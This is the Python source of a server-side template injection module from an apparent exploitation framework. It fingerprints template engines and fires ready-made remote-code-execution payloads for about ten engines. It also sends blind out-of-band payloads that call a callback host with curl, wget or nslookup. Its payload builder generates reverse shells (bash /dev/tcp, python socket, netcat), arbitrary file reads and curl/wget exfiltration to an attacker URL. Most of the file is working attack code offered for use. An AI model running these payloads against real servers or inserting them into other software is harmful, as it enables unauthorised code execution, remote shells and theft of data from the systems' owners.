"""SSTI (Server-Side Template Injection) module for automated detection and exploitation

This module implements:
- Syntax-testing payloads to identify template engines
- Template engine identification from rendered output
- Engine-specific RCE payloads
- Blind SSTI detection using OOB callbacks
- Interactive payload builder for custom exploitation
"""

import asyncio
import re
import time
from dataclasses import dataclass, field
from enum import Enum
from typing import Dict, List, Optional, Tuple

from src.vulnchain.core.request_handler import RequestHandler, Response
from src.vulnchain.core.payload_engine import PayloadEngine
from src.vulnchain.core.oob_listener import OOBListener
from src.vulnchain.models.target import TargetConfig


class TemplateEngine(Enum):
    """Supported template engines"""
    
    JINJA2 = "jinja2"  # Python - Flask, Django
    TWIG = "twig"  # PHP - Symfony
    FREEMARKER = "freemarker"  # Java
    VELOCITY = "velocity"  # Java
    SMARTY = "smarty"  # PHP
    MAKO = "mako"  # Python
    ERB = "erb"  # Ruby - Rails
    HANDLEBARS = "handlebars"  # JavaScript
    PEBBLE = "pebble"  # Java
    THYMELEAF = "thymeleaf"  # Java
    JADE = "jade"  # JavaScript
    UNKNOWN = "unknown"


class SSTIType(Enum):
    """Types of SSTI techniques"""
    
    DIRECT = "direct"  # Direct output visible
    BLIND_OOB = "blind_oob"  # Blind with OOB callbacks
    ERROR_BASED = "error_based"  # Error messages reveal injection


@dataclass
class InjectionPoint:
    """Represents a potential SSTI injection point"""
    
    parameter: str
    location: str  # query, post, header, cookie, body
    original_value: str
    url: str
    method: str = "GET"
    headers: Dict[str, str] = field(default_factory=dict)
    data: Optional[Dict[str, str]] = None
    body: Optional[str] = None


@dataclass
class SSTIResult:
    """Result of SSTI testing"""
    
    injection_point: InjectionPoint
    is_vulnerable: bool
    ssti_type: Optional[SSTIType] = None
    template_engine: Optional[TemplateEngine] = None
    payload: Optional[str] = None
    confidence: float = 0.0
    output: Optional[str] = None
    oob_callback_id: Optional[str] = None
    evidence: List[str] = field(default_factory=list)
    metadata: Dict = field(default_factory=dict)


class SSTITester:
    """SSTI detection and exploitation"""
    
    # Template engine detection patterns
    # Format: {engine: [(test_payload, expected_output_pattern)]}
    ENGINE_DETECTION_PAYLOADS = {
        TemplateEngine.JINJA2: [
            ("{{7*7}}", r"49"),
            ("{{7*'7'}}", r"7777777"),
            ("{{config}}", r"<Config"),
            ("{{self}}", r"<TemplateReference"),
        ],
        TemplateEngine.TWIG: [
            ("{{7*7}}", r"49"),
            ("{{7*'7'}}", r"7777777"),
            ("{{_self}}", r"__TwigTemplate"),
        ],
        TemplateEngine.FREEMARKER: [
            ("${7*7}", r"49"),
            ("#{7*7}", r"49"),
            ("${7*'7'}", r"49"),
        ],
        TemplateEngine.VELOCITY: [
            ("#set($x=7*7)$x", r"49"),
            ("$class.inspect", r"class"),
        ],
        TemplateEngine.SMARTY: [
            ("{7*7}", r"49"),
            ("{$smarty.version}", r"\d+\.\d+"),
        ],
        TemplateEngine.MAKO: [
            ("${7*7}", r"49"),
            ("<%=7*7%>", r"49"),
        ],
        TemplateEngine.ERB: [
            ("<%=7*7%>", r"49"),
            ("<%=7*'7'%>", r"7777777"),
        ],
        TemplateEngine.HANDLEBARS: [
            ("{{#with 'a' as |x|}}{{x}}{{/with}}", r"a"),
        ],
        TemplateEngine.PEBBLE: [
            ("{{7*7}}", r"49"),
        ],
        TemplateEngine.THYMELEAF: [
            ("${7*7}", r"49"),
            ("*{7*7}", r"49"),
        ],
        TemplateEngine.JADE: [
            ("#{7*7}", r"49"),
        ],
    }
    
    # RCE payloads for each template engine
    RCE_PAYLOADS = {
        TemplateEngine.JINJA2: [
            # Basic RCE
            "{{config.__class__.__init__.__globals__['os'].popen('COMMAND').read()}}",
            "{{''.__class__.__mro__[1].__subclasses__()[SUBPROCESS_INDEX]('COMMAND',shell=True,stdout=-1).communicate()[0].strip()}}",
            "{{request.application.__globals__.__builtins__.__import__('os').popen('COMMAND').read()}}",
            # Newer Jinja2 versions
            "{{cycler.__init__.__globals__.os.popen('COMMAND').read()}}",
            "{{joiner.__init__.__globals__.os.popen('COMMAND').read()}}",
        ],
        TemplateEngine.TWIG: [
            "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('COMMAND')}}",
            "{{_self.env.registerUndefinedFilterCallback('system')}}{{_self.env.getFilter('COMMAND')}}",
            "{{_self.env.registerUndefinedFilterCallback('passthru')}}{{_self.env.getFilter('COMMAND')}}",
        ],
        TemplateEngine.FREEMARKER: [
            "<#assign ex='freemarker.template.utility.Execute'?new()>${ex('COMMAND')}",
            "<#assign classloader=object?api.class.getClassLoader()><#assign owc=classloader.loadClass('freemarker.template.utility.ObjectWrapper')><#assign dwf=owc.getField('DEFAULT_WRAPPER').get(null)><#assign ec=classloader.loadClass('freemarker.template.utility.Execute')>${dwf.newInstance(ec,null)('COMMAND')}",
        ],
        TemplateEngine.VELOCITY: [
            "#set($x='')#set($rt=$x.class.forName('java.lang.Runtime'))#set($chr=$x.class.forName('java.lang.Character'))#set($str=$x.class.forName('java.lang.String'))#set($ex=$rt.getRuntime().exec('COMMAND'))$ex.waitFor()#set($out=$ex.getInputStream())#foreach($i in [1..$out.available()])$str.valueOf($chr.toChars($out.read()))#end",
        ],
        TemplateEngine.SMARTY: [
            "{system('COMMAND')}",
            "{php}system('COMMAND');{/php}",
        ],
        TemplateEngine.MAKO: [
            "<%import os%>${os.popen('COMMAND').read()}",
            "<% import subprocess %>${subprocess.check_output('COMMAND',shell=True)}",
        ],
        TemplateEngine.ERB: [
            "<%=`COMMAND`%>",
            "<%=system('COMMAND')%>",
            "<%require 'open3'%><%=Open3.capture2('COMMAND')[0]%>",
        ],
        TemplateEngine.HANDLEBARS: [
            # Handlebars doesn't have direct RCE, but can be exploited via prototype pollution
            "{{#with 'constructor'}}{{#with split as |a|}}{{pop (push 'alert(1)')}}{{#with (concat (lookup join (slice 0 1)))}}{{#each (slice 2 3)}}{{#with (string.sub.call (object.keys this) 0 1)}}{{#if (eq this 'c')}}{{#with (lookup this 'constructor')}}{{this}}{{/with}}{{/if}}{{/with}}{{/each}}{{/with}}{{/with}}{{/with}}",
        ],
        TemplateEngine.PEBBLE: [
            "{{beans.getClass().forName('java.lang.Runtime').getRuntime().exec('COMMAND')}}",
        ],
        TemplateEngine.THYMELEAF: [
            "${T(java.lang.Runtime).getRuntime().exec('COMMAND')}",
            "*{T(java.lang.Runtime).getRuntime().exec('COMMAND')}",
        ],
    }
    
    def __init__(
        self,
        request_handler: RequestHandler,
        oob_listener: Optional[OOBListener] = None,
        payload_engine: Optional[PayloadEngine] = None,
    ):
        """Initialize SSTI tester
        
        Args:
            request_handler: Request handler for HTTP communication
            oob_listener: Optional OOB listener for blind SSTI detection
            payload_engine: Optional payload engine for wordlists
        """
        self.request_handler = request_handler
        self.oob_listener = oob_listener
        self.payload_engine = payload_engine or PayloadEngine()
        self._load_default_payloads()
    
    def _load_default_payloads(self):
        """Load default SSTI payloads"""
        # Add detection payloads
        for engine, payloads in self.ENGINE_DETECTION_PAYLOADS.items():
            for payload, _ in payloads:
                self.payload_engine.add_custom_payload(
                    payload,
                    f"ssti_detect_{engine.value}"
                )
        
        # Add RCE payloads
        for engine, payloads in self.RCE_PAYLOADS.items():
            for payload in payloads:
                self.payload_engine.add_custom_payload(
                    payload,
                    f"ssti_rce_{engine.value}"
                )
    
    async def test_injection_point(
        self,
        injection_point: InjectionPoint,
        techniques: Optional[List[SSTIType]] = None,
    ) -> List[SSTIResult]:
        """Test an injection point for SSTI
        
        Args:
            injection_point: The injection point to test
            techniques: List of techniques to use (default: all)
        
        Returns:
            List of SSTI results
        """
        if techniques is None:
            techniques = list(SSTIType)
        
        results = []
        
        # Test each technique
        for technique in techniques:
            if technique == SSTIType.DIRECT:
                result = await self._test_direct_ssti(injection_point)
            elif technique == SSTIType.ERROR_BASED:
                result = await self._test_error_based_ssti(injection_point)
            elif technique == SSTIType.BLIND_OOB:
                if self.oob_listener:
                    result = await self._test_blind_oob_ssti(injection_point)
                else:
                    continue
            else:
                continue
            
            if result:
                results.append(result)
                
                # If we found a vulnerability, we can stop testing
                if result.is_vulnerable:
                    break
        
        return results
    
    async def _test_direct_ssti(
        self, injection_point: InjectionPoint
    ) -> Optional[SSTIResult]:
        """Test for direct SSTI with visible output
        
        Args:
            injection_point: The injection point to test
        
        Returns:
            SSTIResult if vulnerability found, None otherwise
        """
        # Get baseline response
        baseline_response = await self._send_request(injection_point, injection_point.original_value)
        baseline_text = baseline_response.text
        
        # Test each template engine
        for engine, detection_payloads in self.ENGINE_DETECTION_PAYLOADS.items():
            for test_payload, expected_pattern in detection_payloads:
                # Construct injection payload
                injection_payload = f"{injection_point.original_value}{test_payload}"
                
                # Send request with payload
                response = await self._send_request(injection_point, injection_payload)
                response_text = response.text
                
                # Check if expected output is present
                if re.search(expected_pattern, response_text) and expected_pattern not in baseline_text:
                    # Found template engine!
                    # Now try RCE payloads
                    rce_result = await self._test_rce_payloads(
                        injection_point,
                        engine,
                        baseline_text,
                    )
                    
                    if rce_result:
                        return rce_result
                    
                    # Even if RCE failed, we found SSTI
                    return SSTIResult(
                        injection_point=injection_point,
                        is_vulnerable=True,
                        ssti_type=SSTIType.DIRECT,
                        template_engine=engine,
                        payload=injection_payload,
                        confidence=0.90,
                        output=response_text[:500],
                        evidence=[
                            f"Template engine detected: {engine.value}",
                            f"Detection payload: {test_payload}",
                            f"Expected pattern: {expected_pattern}",
                            f"Response contains expected output",
                        ],
                    )
        
        # No vulnerability found
        return SSTIResult(
            injection_point=injection_point,
            is_vulnerable=False,
            ssti_type=SSTIType.DIRECT,
            confidence=0.0,
        )
    
    async def _test_rce_payloads(
        self,
        injection_point: InjectionPoint,
        engine: TemplateEngine,
        baseline_text: str,
    ) -> Optional[SSTIResult]:
        """Test RCE payloads for a specific template engine
        
        Args:
            injection_point: The injection point
            engine: The detected template engine
            baseline_text: Baseline response text
        
        Returns:
            SSTIResult if RCE successful, None otherwise
        """
        if engine not in self.RCE_PAYLOADS:
            return None
        
        # Test commands that produce distinctive output
        test_commands = [
            ("id", r"uid=\d+"),
            ("whoami", r"\w+"),
            ("pwd", r"/"),
            ("echo SSTI_TEST_12345", r"SSTI_TEST_12345"),
        ]
        
        for command, output_pattern in test_commands:
            for rce_template in self.RCE_PAYLOADS[engine]:
                # Replace COMMAND placeholder
                rce_payload = rce_template.replace("COMMAND", command)
                
                # Construct injection payload
                injection_payload = f"{injection_point.original_value}{rce_payload}"
                
                # Send request with RCE payload
                response = await self._send_request(injection_point, injection_payload)
                response_text = response.text
                
                # Check if command output is present
                if re.search(output_pattern, response_text) and output_pattern not in baseline_text:
                    # RCE successful!
                    return SSTIResult(
                        injection_point=injection_point,
                        is_vulnerable=True,
                        ssti_type=SSTIType.DIRECT,
                        template_engine=engine,
                        payload=injection_payload,
                        confidence=0.95,
                        output=response_text[:500],
                        evidence=[
                            f"RCE achieved via SSTI",
                            f"Template engine: {engine.value}",
                            f"Command executed: {command}",
                            f"RCE payload: {rce_payload[:200]}",
                            f"Command output detected in response",
                        ],
                        metadata={
                            "command": command,
                            "rce_template": rce_template,
                        },
                    )
        
        return None
    
    async def _test_error_based_ssti(
        self, injection_point: InjectionPoint
    ) -> Optional[SSTIResult]:
        """Test for error-based SSTI
        
        Args:
            injection_point: The injection point to test
        
        Returns:
            SSTIResult if vulnerability found, None otherwise
        """
        # Get baseline response
        baseline_response = await self._send_request(injection_point, injection_point.original_value)
        baseline_text = baseline_response.text.lower()
        
        # Error-inducing payloads
        error_payloads = [
            "{{",
            "}}",
            "{%",
            "%}",
            "<%",
            "%>",
            "${",
            "#{",
            "{{7/0}}",
            "${7/0}",
            "<%=7/0%>",
            "{{undefined_variable}}",
            "${undefined_variable}",
        ]
        
        # Template engine error patterns
        error_patterns = {
            TemplateEngine.JINJA2: [
                r"jinja2\.",
                r"TemplateError",
                r"UndefinedError",
                r"TemplateSyntaxError",
            ],
            TemplateEngine.TWIG: [
                r"Twig_Error",
                r"Twig\\Error",
                r"Twig_",
            ],
            TemplateEngine.FREEMARKER: [
                r"freemarker\.",
                r"TemplateException",
                r"ParseException",
            ],
            TemplateEngine.VELOCITY: [
                r"velocity\.",
                r"VelocityException",
                r"ParseErrorException",
            ],
            TemplateEngine.SMARTY: [
                r"Smarty",
                r"SmartyException",
            ],
            TemplateEngine.MAKO: [
                r"mako\.",
                r"MakoException",
                r"TemplateLookupException",
            ],
            TemplateEngine.ERB: [
                r"erb",
                r"SyntaxError.*erb",
            ],
            TemplateEngine.THYMELEAF: [
                r"thymeleaf",
                r"TemplateProcessingException",
            ],
        }
        
        for payload in error_payloads:
            # Construct injection payload
            injection_payload = f"{injection_point.original_value}{payload}"
            
            # Send request with payload
            response = await self._send_request(injection_point, injection_payload)
            response_text = response.text.lower()
            
            # Check for template engine errors
            for engine, patterns in error_patterns.items():
                for pattern in patterns:
                    if re.search(pattern, response_text, re.IGNORECASE) and pattern.lower() not in baseline_text:
                        # Found template engine error!
                        return SSTIResult(
                            injection_point=injection_point,
                            is_vulnerable=True,
                            ssti_type=SSTIType.ERROR_BASED,
                            template_engine=engine,
                            payload=injection_payload,
                            confidence=0.85,
                            output=response_text[:500],
                            evidence=[
                                f"Template engine error detected: {engine.value}",
                                f"Error payload: {payload}",
                                f"Error pattern matched: {pattern}",
                            ],
                        )
        
        # No vulnerability found
        return SSTIResult(
            injection_point=injection_point,
            is_vulnerable=False,
            ssti_type=SSTIType.ERROR_BASED,
            confidence=0.0,
        )
    
    async def _test_blind_oob_ssti(
        self, injection_point: InjectionPoint
    ) -> Optional[SSTIResult]:
        """Test for blind SSTI using OOB callbacks
        
        Args:
            injection_point: The injection point to test
        
        Returns:
            SSTIResult if vulnerability found, None otherwise
        """
        if not self.oob_listener:
            return None
        
        # Test each template engine with OOB payloads
        for engine in [TemplateEngine.JINJA2, TemplateEngine.TWIG, TemplateEngine.FREEMARKER,
                       TemplateEngine.VELOCITY, TemplateEngine.MAKO, TemplateEngine.ERB]:
            # Generate unique OOB identifier
            unique_id = self.oob_listener.generate_unique_id()
            
            # Generate OOB payloads for this engine
            oob_payloads = self._generate_oob_payloads(engine, unique_id)
            
            for payload_name, oob_payload in oob_payloads.items():
                # Construct injection payload
                injection_payload = f"{injection_point.original_value}{oob_payload}"
                
                # Register payload with OOB listener
                await self.oob_listener.register_payload(
                    unique_id=unique_id,
                    payload=injection_payload,
                    target_url=injection_point.url,
                    injection_point=injection_point.parameter,
                    vulnerability_type="ssti_blind",
                    metadata={
                        "template_engine": engine.value,
                        "payload_type": payload_name,
                    },
                )
                
                # Send request with OOB payload
                response = await self._send_request(injection_point, injection_payload)
                
                # Wait for OOB callback
                callback = await self.oob_listener.wait_for_callback(unique_id, timeout=10.0)
                
                if callback:
                    # OOB callback received - SSTI confirmed!
                    return SSTIResult(
                        injection_point=injection_point,
                        is_vulnerable=True,
                        ssti_type=SSTIType.BLIND_OOB,
                        template_engine=engine,
                        payload=injection_payload,
                        confidence=0.95,
                        oob_callback_id=callback.callback_id,
                        evidence=[
                            f"OOB callback received - blind SSTI confirmed",
                            f"Template engine: {engine.value}",
                            f"Payload type: {payload_name}",
                            f"Callback type: {callback.callback_type}",
                            f"Source IP: {callback.source_ip}",
                        ],
                        metadata={
                            "callback": {
                                "type": callback.callback_type,
                                "source_ip": callback.source_ip,
                                "timestamp": callback.timestamp.isoformat(),
                            },
                        },
                    )
        
        # No vulnerability found
        return SSTIResult(
            injection_point=injection_point,
            is_vulnerable=False,
            ssti_type=SSTIType.BLIND_OOB,
            confidence=0.0,
        )
    
    def _generate_oob_payloads(
        self, engine: TemplateEngine, unique_id: str
    ) -> Dict[str, str]:
        """Generate OOB payloads for a specific template engine
        
        Args:
            engine: The template engine
            unique_id: Unique identifier for correlation
        
        Returns:
            Dictionary of payload name to payload string
        """
        http_url = self.oob_listener.get_callback_url(unique_id)
        dns_hostname = self.oob_listener.get_dns_callback(unique_id)
        
        payloads = {}
        
        if engine == TemplateEngine.JINJA2:
            payloads["curl_http"] = f"{{{{config.__class__.__init__.__globals__['os'].popen('curl {http_url}').read()}}}}"
            payloads["wget_http"] = f"{{{{config.__class__.__init__.__globals__['os'].popen('wget {http_url}').read()}}}}"
            payloads["nslookup_dns"] = f"{{{{config.__class__.__init__.__globals__['os'].popen('nslookup {dns_hostname}').read()}}}}"
        
        elif engine == TemplateEngine.TWIG:
            payloads["curl_http"] = f"{{{{_self.env.registerUndefinedFilterCallback('exec')}}}}{{{{_self.env.getFilter('curl {http_url}')}}}}"
            payloads["nslookup_dns"] = f"{{{{_self.env.registerUndefinedFilterCallback('exec')}}}}{{{{_self.env.getFilter('nslookup {dns_hostname}')}}}}"
        
        elif engine == TemplateEngine.FREEMARKER:
            payloads["curl_http"] = f"<#assign ex='freemarker.template.utility.Execute'?new()>${{ex('curl {http_url}')}}"
            payloads["nslookup_dns"] = f"<#assign ex='freemarker.template.utility.Execute'?new()>${{ex('nslookup {dns_hostname}')}}"
        
        elif engine == TemplateEngine.VELOCITY:
            payloads["curl_http"] = f"#set($x='')#set($rt=$x.class.forName('java.lang.Runtime'))#set($ex=$rt.getRuntime().exec('curl {http_url}'))$ex.waitFor()"
            payloads["nslookup_dns"] = f"#set($x='')#set($rt=$x.class.forName('java.lang.Runtime'))#set($ex=$rt.getRuntime().exec('nslookup {dns_hostname}'))$ex.waitFor()"
        
        elif engine == TemplateEngine.MAKO:
            payloads["curl_http"] = f"<%import os%>${{os.popen('curl {http_url}').read()}}"
            payloads["nslookup_dns"] = f"<%import os%>${{os.popen('nslookup {dns_hostname}').read()}}"
        
        elif engine == TemplateEngine.ERB:
            payloads["curl_http"] = f"<%=`curl {http_url}`%>"
            payloads["nslookup_dns"] = f"<%=`nslookup {dns_hostname}`%>"
        
        return payloads
    
    async def _send_request(
        self, injection_point: InjectionPoint, value: str
    ) -> Response:
        """Send request with injected value
        
        Args:
            injection_point: The injection point
            value: The value to inject
        
        Returns:
            Response object
        """
        if injection_point.location == "query":
            # Inject into URL query parameter
            from urllib.parse import urlencode, urlparse, parse_qs, urlunparse
            
            parsed = urlparse(injection_point.url)
            params = parse_qs(parsed.query)
            params[injection_point.parameter] = [value]
            new_query = urlencode(params, doseq=True)
            new_url = urlunparse((
                parsed.scheme,
                parsed.netloc,
                parsed.path,
                parsed.params,
                new_query,
                parsed.fragment,
            ))
            
            return await self.request_handler.send_request(
                method=injection_point.method,
                url=new_url,
                headers=injection_point.headers,
            )
        
        elif injection_point.location == "post":
            # Inject into POST data
            data = injection_point.data.copy() if injection_point.data else {}
            data[injection_point.parameter] = value
            
            return await self.request_handler.send_request(
                method=injection_point.method,
                url=injection_point.url,
                headers=injection_point.headers,
                data=data,
            )
        
        elif injection_point.location == "body":
            # Inject into request body
            return await self.request_handler.send_request(
                method=injection_point.method,
                url=injection_point.url,
                headers=injection_point.headers,
                data=value,
            )
        
        elif injection_point.location == "header":
            # Inject into header
            headers = injection_point.headers.copy()
            headers[injection_point.parameter] = value
            
            return await self.request_handler.send_request(
                method=injection_point.method,
                url=injection_point.url,
                headers=headers,
                data=injection_point.data,
            )
        
        elif injection_point.location == "cookie":
            # Inject into cookie
            cookies = {injection_point.parameter: value}
            
            return await self.request_handler.send_request(
                method=injection_point.method,
                url=injection_point.url,
                headers=injection_point.headers,
                cookies=cookies,
                data=injection_point.data,
            )
        
        else:
            raise ValueError(f"Unsupported injection location: {injection_point.location}")


class SSTIPayloadBuilder:
    """Interactive payload builder for custom SSTI exploitation"""
    
    def __init__(self, template_engine: TemplateEngine):
        """Initialize payload builder
        
        Args:
            template_engine: The target template engine
        """
        self.template_engine = template_engine
        self.payload_templates = SSTITester.RCE_PAYLOADS.get(template_engine, [])
    
    def build_command_payload(self, command: str) -> List[str]:
        """Build payloads for executing a command
        
        Args:
            command: Command to execute
        
        Returns:
            List of payload strings
        """
        payloads = []
        
        for template in self.payload_templates:
            payload = template.replace("COMMAND", command)
            payloads.append(payload)
        
        return payloads
    
    def build_file_read_payload(self, file_path: str) -> List[str]:
        """Build payloads for reading a file
        
        Args:
            file_path: Path to file to read
        
        Returns:
            List of payload strings
        """
        # Convert file read to command execution
        if self.template_engine in [TemplateEngine.JINJA2, TemplateEngine.MAKO]:
            command = f"cat {file_path}"
        elif self.template_engine in [TemplateEngine.TWIG, TemplateEngine.SMARTY]:
            command = f"cat {file_path}"
        elif self.template_engine in [TemplateEngine.FREEMARKER, TemplateEngine.VELOCITY,
                                       TemplateEngine.PEBBLE, TemplateEngine.THYMELEAF]:
            command = f"cat {file_path}"
        elif self.template_engine == TemplateEngine.ERB:
            command = f"cat {file_path}"
        else:
            command = f"cat {file_path}"
        
        return self.build_command_payload(command)
    
    def build_reverse_shell_payload(self, host: str, port: int) -> List[str]:
        """Build payloads for reverse shell
        
        Args:
            host: Attacker host
            port: Attacker port
        
        Returns:
            List of payload strings
        """
        # Bash reverse shell
        command = f"bash -i >& /dev/tcp/{host}/{port} 0>&1"
        
        payloads = self.build_command_payload(command)
        
        # Add alternative reverse shells
        alt_commands = [
            f"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{host}\",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
            f"nc -e /bin/sh {host} {port}",
            f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {host} {port} >/tmp/f",
        ]
        
        for cmd in alt_commands:
            payloads.extend(self.build_command_payload(cmd))
        
        return payloads
    
    def build_data_exfiltration_payload(self, data_source: str, exfil_url: str) -> List[str]:
        """Build payloads for data exfiltration
        
        Args:
            data_source: Source of data (file path, command, etc.)
            exfil_url: URL to exfiltrate data to
        
        Returns:
            List of payload strings
        """
        # Use curl to exfiltrate data
        command = f"curl -X POST -d @{data_source} {exfil_url}"
        
        payloads = self.build_command_payload(command)
        
        # Add alternative exfiltration methods
        alt_commands = [
            f"wget --post-file={data_source} {exfil_url}",
            f"cat {data_source} | curl -X POST --data-binary @- {exfil_url}",
        ]
        
        for cmd in alt_commands:
            payloads.extend(self.build_command_payload(cmd))
        
        return payloads
    
    def get_available_templates(self) -> List[str]:
        """Get list of available payload templates
        
        Returns:
            List of template strings
        """
        return self.payload_templates.copy()
    
    def customize_template(self, template_index: int, replacements: Dict[str, str]) -> str:
        """Customize a payload template with custom replacements
        
        Args:
            template_index: Index of template to customize
            replacements: Dictionary of placeholder to replacement value
        
        Returns:
            Customized payload string
        """
        if template_index < 0 or template_index >= len(self.payload_templates):
            raise ValueError(f"Invalid template index: {template_index}")
        
        template = self.payload_templates[template_index]
        
        # Apply replacements
        for placeholder, value in replacements.items():
            template = template.replace(placeholder, value)
        
        return template
